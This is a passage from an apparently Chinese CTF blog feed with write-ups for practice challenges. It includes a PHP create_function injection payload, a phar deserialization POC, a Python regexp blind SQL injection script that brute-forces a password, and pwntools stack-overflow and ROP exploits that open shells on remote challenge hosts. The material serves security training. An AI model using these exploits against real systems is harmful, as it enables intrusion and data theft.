class="number">9</span>a%<span class="number">9</span>e%ce%<span class="number">99</span>%<span class="number">93</span>%cb%<span class="number">98</span>%d1%<span class="number">8</span>f%<span class="number">97</span>%<span class="number">8</span>f))</span><br><span class="line">    </span><br><span class="line">   </span><br><span class="line">    flag&#123;Congratulations!Y0u_Get_thE_rea1f1114g&#125;</span><br><span class="line">http:<span class="comment">//47.94.0.250:3000/1nD3x.php</span></span><br><span class="line">?file=%<span class="number">64</span>%<span class="number">61</span>%<span class="number">74</span>%<span class="number">61</span>%<span class="number">3</span>a%<span class="number">2</span>f%<span class="number">2</span>f%<span class="number">74</span>%<span class="number">65</span>%<span class="number">78</span>%<span class="number">74</span>%<span class="number">2</span>f%<span class="number">70</span>%<span class="number">6</span>c%<span class="number">61</span>%<span class="number">69</span>%<span class="number">6</span>e%<span class="number">2</span>c%<span class="number">64</span>%<span class="number">65</span>%<span class="number">62</span>%<span class="number">75</span>%<span class="number">5</span>f%<span class="number">64</span>%<span class="number">65</span>%<span class="number">62</span>%<span class="number">75</span>%<span class="number">5</span>f%<span class="number">61</span>%<span class="number">71</span>%<span class="number">75</span>%<span class="number">61</span></span><br><span class="line">&amp;%<span class="number">64</span>%<span class="number">65</span>%<span class="number">62</span>%<span class="number">75</span>=%<span class="number">61</span>%<span class="number">71</span>%<span class="number">75</span>%<span class="number">61</span>%<span class="number">5</span>f%<span class="number">69</span>%<span class="number">73</span>%<span class="number">5</span>f%<span class="number">63</span>%<span class="number">75</span>%<span class="number">74</span>%<span class="number">65</span>%<span class="number">0</span>a</span><br><span class="line">&amp;%<span class="number">73</span>%<span class="number">68</span>%<span class="number">61</span>%<span class="number">6</span>e%<span class="number">61</span>%<span class="number">5</span>b%<span class="number">5</span>d=<span class="number">1</span></span><br><span class="line">&amp;%<span class="number">70</span>%<span class="number">61</span>%<span class="number">73</span>%<span class="number">73</span>%<span class="number">77</span>%<span class="number">64</span>%<span class="number">5</span>b%<span class="number">5</span>d=<span class="number">2</span></span><br><span class="line">&amp;%<span class="number">66</span>%<span class="number">6</span>c%<span class="number">61</span>%<span class="number">67</span>%<span class="number">5</span>b%<span class="number">63</span>%<span class="number">6</span>f%<span class="number">64</span>%<span class="number">65</span>%<span class="number">5</span>d=%<span class="number">63</span>%<span class="number">72</span>%<span class="number">65</span>%<span class="number">61</span>%<span class="number">74</span>%<span class="number">65</span>%<span class="number">5</span>f%<span class="number">66</span>%<span class="number">75</span>%<span class="number">6</span>e%<span class="number">63</span>%<span class="number">74</span>%<span class="number">69</span>%<span class="number">6</span>f%<span class="number">6</span>e</span><br><span class="line">&amp;%<span class="number">66</span>%<span class="number">6</span>c%<span class="number">61</span>%<span class="number">67</span>%<span class="number">5</span>b%<span class="number">61</span>%<span class="number">72</span>%<span class="number">67</span>%<span class="number">5</span>d=;&#125;var_dump(<span class="keyword">require</span>(~%<span class="number">8</span>F%B7%<span class="number">8</span>F%C5%D0%D0%B9%<span class="number">96</span>%<span class="number">93</span>%AB%<span class="number">9</span>A%<span class="number">8</span>D%D0%<span class="number">9</span>C%<span class="number">90</span>%<span class="number">91</span>%<span class="number">89</span>%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>B%D1%<span class="number">9</span>D%<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">9</span>A%C9%CB%D2%<span class="number">9</span>A%<span class="number">91</span>%<span class="number">9</span>C%<span class="number">90</span>%<span class="number">9</span>B%<span class="number">9</span>A%D0%<span class="number">8</span>D%<span class="number">9</span>A%<span class="number">8</span>C%<span class="number">90</span>%<span class="number">8</span>A%<span class="number">8</span>D%<span class="number">9</span>C%<span class="number">9</span>A%C2%<span class="number">8</span>D%<span class="number">9</span>A%<span class="number">9</span>E%CE%<span class="number">99</span>%<span class="number">93</span>%CB%<span class="number">98</span>%D1%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F));<span class="comment">//</span></span><br></pre></td></tr></table></figure><p><code>https://www.cnblogs.com/rabbittt/p/13323155.html</code></p><p>1 绕过**’QUERY_STRING’**，<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>不会进行urldecode，<code>$_GET[]</code>会，用url编码绕过</p><p>2 <code>preg_match(&#39;/^$/&#39;)</code>用换行符%0a绕过</p><p>3 <code>$_REQUEST</code>绕过，$_REQUEST在同时接收GET和POST参数时，POST优先级更高</p><p>4 <code>file_get_contents函数，用data伪协议绕过data://text/plain,debu_debu_aqua</code></p><p>5<code>$code</code>和<code>$arg</code>可控，利用<code>$code(&#39;&#39;,$arg)</code>进行create_function注入</p><p><code>https://www.cnblogs.com/-chenxs/p/11459374.html</code></p><h3 id="GYCTF2020-EasyThinking"><a href="#GYCTF2020-EasyThinking" class="headerlink" title="[GYCTF2020]EasyThinking"></a>[GYCTF2020]EasyThinking</h3><p><code>https://blog.csdn.net/mochu7777777/article/details/105160796</code></p><p><code>ThinkPHP v6.0.0~6.0.1 任意文件操作漏洞分析</code></p><p><code>http://j0k3r.top/2020/03/02/ThinkPHP_v6.0.0_ArbitraryFileWriting/#1-%E6%90%AD%E5%BB%BA%E7%8E%AF%E5%A2%83</code></p>]]></content>
    
    
    <summary type="html">UIUCTF 2021+buu题目</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>WEBPWN</title>
    <link href="http://upload.love/2021/07/30/WEBPWN/"/>
    <id>http://upload.love/2021/07/30/WEBPWN/</id>
    <published>2021-07-30T04:25:09.000Z</published>
    <updated>2021-08-04T04:00:38.718Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h1><p><code>https://xz.aliyun.com/t/6454#toc-4</code></p><h2 id="知识点：phar反序列化"><a href="#知识点：phar反序列化" class="headerlink" title="知识点：phar反序列化"></a><code>知识点：phar反序列化</code></h2><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210730151638.png" alt="img"></p><p>本地调试的时候发现一个问题！</p><p><code>file.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;function.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>] ? $_GET[<span class="string">&#x27;file&#x27;</span>] : <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($file)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="number">111</span>;</span><br><span class="line"><span class="keyword">echo</span> $file;</span><br><span class="line">$show = <span class="keyword">new</span> Show($file);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="number">1111111</span>;</span><br><span class="line">$bb = $_POST[<span class="string">&#x27;1&#x27;</span>];</span><br><span class="line">unserialize($bb);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(file_exists($file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="number">1</span>;</span><br><span class="line">    $show-&gt;source = $file;</span><br><span class="line">    $show-&gt;_show();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>($file))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;file doesn\&#x27;t exists.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这时我的调试文件！但是发现<code>$show = new Show($file) </code> <code>$show = new Show()</code> 里面没参数的时候本地就直接停止了！可以题目还是可以打通的！</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = <span class="keyword">new</span> Show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]=<span class="keyword">new</span> Test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params[<span class="string">&#x27;source&#x27;</span>] = <span class="string">&#x27;/var/www/html/f1ag.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> C1e4r();</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> urlencode($b);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;1.phar&quot;</span>); <span class="comment">//.phar文件</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); <span class="comment">//固定的</span></span><br><span class="line">$phar-&gt;setMetadata($a); <span class="comment">//触发的头是C1e4r类，所以传入C1e4r对象</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//随便写点什么生成个签名</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//?file=phar://upload/585f1fbe32529f305013a803331675a1.jpg</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//phar://upload/290b716447ed10fc5663195f9e34f86d.jpg</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NCTF2019-SQLi"><a href="#NCTF2019-SQLi" class="headerlink" title="[NCTF2019]SQLi"></a>[NCTF2019]SQLi</h1><h2 id="知识点：regexp正则注入"><a href="#知识点：regexp正则注入" class="headerlink" title="知识点：regexp正则注入"></a><code>知识点：regexp正则注入</code></h2><p><code>https://xz.aliyun.com/t/8003#toc-4</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$black_list = <span class="string">&quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#x27;|=| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> $_POST[<span class="string">&#x27;passwd&#x27;</span>] === admin<span class="string">&#x27;s password,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Then you will get the flag;</span></span><br></pre></td></tr></table></figure><p>不知道为什么%00明明过滤了还能用！</p><p>payload</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;ad\&amp;passwd&#x3D;&#x2F;**&#x2F;||&#x2F;**&#x2F;1;%00  后门必须来个空字节！ 不然是最好那个单引号好像去不掉 和分号一起是又问题的！</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210730190422.png" alt="image-20210730190422265"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210730190637.png" alt="image-20210730190637243"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210730190908.png" alt="image-20210730190908735"></p><p><code>binary比较将字符串转换为二进制字符串</code></p><p><code>这里binary被办了！没有也行</code></p><p><code>like和REGEXP 一样都可以用16进制</code> <code>用法一样</code></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2021/7/30 15:35</span></span><br><span class="line"><span class="comment"># @Author  : upload</span></span><br><span class="line"><span class="comment"># @File    : [NCTF2019]SQLi.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">proxy = <span class="string">&#x27;127.0.0.1:8080&#x27;</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://&#x27;</span> + proxy,</span><br><span class="line">    <span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;https://&#x27;</span> + proxy,</span><br><span class="line">&#125;</span><br><span class="line">dic = string.ascii_letters + string.digits + <span class="string">&#x27;_!@#$%^&amp;*&#123;&#125;.-&#x27;</span></span><br><span class="line">print(dic)</span><br><span class="line">burp0_url = <span class="string">&quot;http://2d7b07e2-08ce-4599-bead-39fff8394597.node4.buuoj.cn:80/index.php&quot;</span></span><br><span class="line">burp0_cookies = &#123;<span class="string">&quot;UM_distinctid&quot;</span>: <span class="string">&quot;179a8787815906-09d310bee36c31-5771031-144000-179a87878164ad&quot;</span>, <span class="string">&quot;OUTFOX_SEARCH_USER_ID_NCOO&quot;</span>: <span class="string">&quot;1935872068.9989924&quot;</span>&#125;</span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://2d7b07e2-08ce-4599-bead-39fff8394597.node4.buuoj.cn&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://2d7b07e2-08ce-4599-bead-39fff8394597.node4.buuoj.cn/&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en;q=0.8&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># burp0_data = &#123;&#x27;username&#x27;: &#x27;ad\\&#x27;, &#x27;passwd&#x27;: &#x27;/**/||/**/passwd/**/REGEXP/**/&quot;^y&quot;;\x00&#x27;&#125;</span></span><br><span class="line"><span class="comment"># r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,proxies=proxies)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># print(r.status_code)</span></span><br><span class="line"><span class="comment"># if &#x27;The requested URL /welcome.php was not found on this server&#x27; in r.text:</span></span><br><span class="line"><span class="comment">#     print(11111)</span></span><br><span class="line"><span class="comment">#404  居然不能写302 算了算了</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#这里为了区分大小写</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2hex</span>(<span class="params">string</span>):</span></span><br><span class="line">  result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">    result += hex(ord(i))</span><br><span class="line">  result = result.replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span>+result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">poc = <span class="string">&#x27;/**/||/**/passwd/**/REGEXP/**/&#123;&#125;;\x00&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    f=flag</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(j)</span></span><br><span class="line">        passwd = str2hex(<span class="string">&#x27;^&#x27;</span> + flag + j) <span class="comment"># 这里payload就不用带引号了！ 带引号反而执行不了</span></span><br><span class="line">        poc22=poc.format(passwd)</span><br><span class="line">        <span class="comment"># print(poc22)</span></span><br><span class="line">        burp0_data = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;ad\\&quot;</span>, <span class="string">&quot;passwd&quot;</span>: poc22&#125;</span><br><span class="line">        <span class="comment"># print(burp0_data)</span></span><br><span class="line">        r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,proxies=proxies)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">404</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> r.status_code == <span class="number">429</span>:</span><br><span class="line">            print(<span class="string">&#x27;fast wait a little&#x27;</span>)</span><br><span class="line">            time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> flag==f:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#username=ad\&amp;passwd=/**/||/**/1;%00</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#^you_Will_never_kNow7788990$$$$$$$$$$$$$$$$$$$G</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="watevrCTF-2019-Cookie-Store"><a href="#watevrCTF-2019-Cookie-Store" class="headerlink" title="[watevrCTF-2019]Cookie Store"></a>[watevrCTF-2019]Cookie Store</h1><p>这啥题呀！</p><p>把session删了！发过去！</p><p>再修改买就行了！</p>]]></content>
    
    
    <summary type="html">BUUweb pwn gogogogog</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>PWNPWNPWN</title>
    <link href="http://upload.love/2021/07/25/PWNPWNPWN/"/>
    <id>http://upload.love/2021/07/25/PWNPWNPWN/</id>
    <published>2021-07-25T07:26:18.000Z</published>
    <updated>2021-07-28T14:06:26.542Z</updated>
    
    <content type="html"><![CDATA[<h1 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h1><p>菜鸡了解了什么是溢出，他相信自己能得到shell</p><h2 id="知识点：简单的栈溢出"><a href="#知识点：简单的栈溢出" class="headerlink" title="知识点：简单的栈溢出"></a>知识点：简单的栈溢出</h2><p>基本的套路！</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file</span><br><span class="line">checksec</span><br></pre></td></tr></table></figure><p>看了下程序</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210725175830.png" alt="image-20210725175830512"></p><p>栈溢出</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210725175840.png" alt="image-20210725175840332"></p><p>它有个system函数！</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210725180031.png" alt="image-20210725180031865"></p><p>那正好！我们的思路就是 栈溢出到那个返回点！直接让那个返回点 返回到<code>callsystem</code>函数</p><h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2021/7/25 18:02</span></span><br><span class="line"><span class="comment"># @Author  : upload</span></span><br><span class="line"><span class="comment"># @File    : level0.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">content = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">if</span> content == <span class="number">1</span>:</span><br><span class="line">upload = process(<span class="string">&quot;level&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">upload = remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="number">49647</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;The exp is error~&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = (<span class="string">&#x27;a&#x27;</span> * (<span class="number">0x80</span> + <span class="number">8</span>)).encode() <span class="comment">#栈溢出</span></span><br><span class="line">payload = payload + p64(<span class="number">0x400596</span>)  <span class="comment"># 跳转指定函数</span></span><br><span class="line"></span><br><span class="line">upload.recvuntil(<span class="string">&quot;Hello, World\n&quot;</span>)</span><br><span class="line">upload.sendline(payload)</span><br><span class="line"></span><br><span class="line">upload.interactive()</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h1><p>菜鸡请教大神如何获得flag，大神告诉他‘使用<code>面向返回的编程</code>(ROP)就可以了’</p><h2 id="知识点：ROP"><a href="#知识点：ROP" class="headerlink" title="知识点：ROP"></a>知识点：ROP</h2><p>看到可以输入大数！</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210725182036.png" alt="image-20210725182036307"></p><p>果然可以溢出</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210725182111.png" alt="image-20210725182111343"></p><p>思路就是 栈溢出 ！让最后的返回  到 我们想要函数点！</p><p>不过这里是ROP知识点！ 我</p><p><code>https://blog.csdn.net/jinzheng069/article/details/14184401</code></p><p>应该是大概是看懂一点点！哈哈哈</p><p>反正就是 </p><p>栈的大小为(0x88)132<br>所有要溢出的部分确定了，132+4+system@plt来构造一个跳转<br>然后在填入4字节垃圾数据</p><p>这里最好还要填入4字节垃圾数据 我不上很懂！ 但我想的是 它要找system函数的值对吧！就要先往里面天一些数据！可能也和它自身的位数有关！ 32位就填4个字节！哈哈哈哈 猜的！我太菜了！</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2021/7/25 19:02</span></span><br><span class="line"><span class="comment"># @Author  : upload</span></span><br><span class="line"><span class="comment"># @File    : level2.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">content = <span class="number">1</span></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;x86&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">if</span> content == <span class="number">1</span>:</span><br><span class="line">upload = process(<span class="string">&quot;./1&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">upload = remote(<span class="string">&quot;2111.200.241.244&quot;</span>,<span class="number">64300</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;[!!]The exp is content error ~&quot;</span>)</span><br><span class="line"></span><br><span class="line">system_plt = elf.plt[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh     = next(elf.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x88</span>+<span class="number">4</span>)</span><br><span class="line">payload = payload + p32(system_plt)</span><br><span class="line">payload = payload + <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span></span><br><span class="line">payload = payload + p32(bin_sh)</span><br><span class="line"></span><br><span class="line">upload.recvline(<span class="string">&quot;Input:\n&quot;</span>)</span><br><span class="line">upload.sendline(payload)</span><br><span class="line"></span><br><span class="line">upload.interactive()</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h1 id="string"><a href="#string" class="headerlink" title="string"></a>string</h1><p>这个程序太多了！奥日 ！等等再看！ 😫😫😫   </p><h1 id="get-shell"><a href="#get-shell" class="headerlink" title="get_shell"></a>get_shell</h1><p>运行就能拿到shell呢，真的</p><h2 id="知识点：nc-题"><a href="#知识点：nc-题" class="headerlink" title="知识点：nc 题"></a>知识点：nc 题</h2><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2021/7/25 21:01</span></span><br><span class="line"><span class="comment"># @Author  : upload</span></span><br><span class="line"><span class="comment"># @File    : get_shell.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">content = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">if</span> content == <span class="number">1</span>:</span><br><span class="line">upload = process(<span class="string">&quot;level&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">upload = remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="number">51969</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;The exp is error~&quot;</span>)</span><br><span class="line">upload.interactive()</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h1 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h1><h2 id="知识点：溢出覆盖"><a href="#知识点：溢出覆盖" class="headerlink" title="知识点：溢出覆盖"></a>知识点：溢出覆盖</h2><p>如果dword_60106C == 1853186401 咱就可以了！</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210725211336.png" alt="image-20210725211335925"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210725211447.png" alt="image-20210725211447743"></p><p>那我们可以覆盖掉那个地方的值！</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210725211506.png" alt="image-20210725211506942"></p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span 